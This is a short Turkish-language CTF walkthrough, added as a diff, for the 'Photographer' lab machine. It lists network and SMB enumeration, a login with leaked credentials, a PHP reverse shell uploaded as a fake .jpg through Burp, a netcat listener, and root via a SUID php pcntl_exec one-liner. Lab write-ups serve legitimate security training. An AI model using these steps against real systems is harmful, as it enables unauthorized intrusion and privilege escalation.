@@ -1,0 +1,11 @@
+PHOTOGRAPHER MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.54 bulundu.
+2 - nmap -sT -A 192.168.2.54
+3 - smbclient -L //192.168.2.54
+4 - smbclient //192.168.2.54/sambashare, get *
+5 - http://192.168.2.54:8000/admin, daisa@photographer.com:babygirl
+6 - php-reverse-shell.php.jpg -> Burp Suite -> .jpg yi sil ve shelli yükle
+7 - nc -lvnp 4444
+8 - http://192.168.2.54:8000/ content kısmından shell e tıkla
+9 - find / -perm -u=s -type f 2>/dev/null
+10 - php -r "pcntl_exec('/bin/sh', ['-p']);", whoami
